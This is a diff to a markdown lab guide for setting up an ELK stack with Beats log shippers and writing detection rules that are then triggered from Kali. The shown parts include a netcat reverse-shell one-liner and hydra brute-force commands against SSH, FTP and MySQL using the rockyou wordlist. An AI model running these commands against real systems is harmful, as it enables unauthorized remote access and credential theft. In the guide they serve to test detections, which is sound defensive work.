@@ -1,6 +1,7 @@
 # INTRODUCTION
 The goal of this page is to go trought all sets 
 - Install ELK Stack with DOCKER
+- Install Filebeat, AuditBeat, WinLogbeat etc on different plateform to send logs
 - Configure theat intel modules to interac with IOCs
 - Create custom rules
 - Triggers the rules with specifics commands in Kali
@@ -675,17 +676,17 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8080 >/tmp/f
 ## GENERATE TRAFFIC - SSH bruteforce
 ```
 nmap -p 22 --script ssh-brute x.x.x.x
-hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt 192.168.6.128 SSH
+hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db SSH
 ```
 
 ## GENERATE TRAFFIC - FTP bruteforce
 ```
-hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt 192.168.6.128 FTP
+hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db FTP
 ```
 
 ## GENERATE TRAFFIC - MYSQL bruteforce
 ```
-hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt 192.168.6.128 MYSQL
+hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db MYSQL
 ```
 
 ## GENERATE TRAFFIC - MYSQL Request
